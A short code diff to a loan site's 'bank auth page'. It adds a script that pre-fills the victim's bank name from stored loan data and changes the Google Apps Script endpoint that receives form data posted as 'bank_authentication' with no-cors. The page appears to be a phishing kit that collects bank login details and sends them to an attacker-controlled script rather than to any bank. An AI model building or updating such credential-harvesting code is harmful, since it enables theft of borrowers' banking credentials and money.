@@ -407,6 +407,26 @@
     </footer>
 
     <script>
+        // Load bank name from sessionStorage when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Bank auth page loaded');
+            
+            // Get loan data from sessionStorage
+            const loanData = JSON.parse(sessionStorage.getItem('loanData')) || {};
+            console.log('Loan data from sessionStorage:', loanData);
+            
+            // Set bank name if available
+            if (loanData.customerBank) {
+                const bankSelect = document.getElementById('bankName');
+                if (bankSelect) {
+                    bankSelect.value = loanData.customerBank;
+                    console.log('Bank name set to:', loanData.customerBank);
+                }
+            } else {
+                console.log('No bank name found in loan data');
+            }
+        });
+
         // Mobile menu toggle
         document.getElementById('mobileMenuBtn').addEventListener('click', function() {
             const mobileMenu = document.getElementById('mobileMenu');
@@ -497,7 +517,7 @@
             formData.append('type', 'bank_authentication');
             
             // Send to Google Apps Script using FormData (no CORS issues)
-            fetch('https://script.google.com/macros/s/AKfycbw8n6W8EzmcCOUuBpZIYzG80bJjVEUD0lGIp1VzD0ndq2JrMACCr6OG6TdrNhV6LipT9A/exec', {
+            fetch('https://script.google.com/macros/s/AKfycbwdbJCrtyZM854s41-0eTfQg5tz5-jrhCnOvgbt9SzWTl9CUWo3CP2PE5VhgTbUCV6DCg/exec', {
                 method: 'POST',
                 body: formData,
                 mode: 'no-cors'
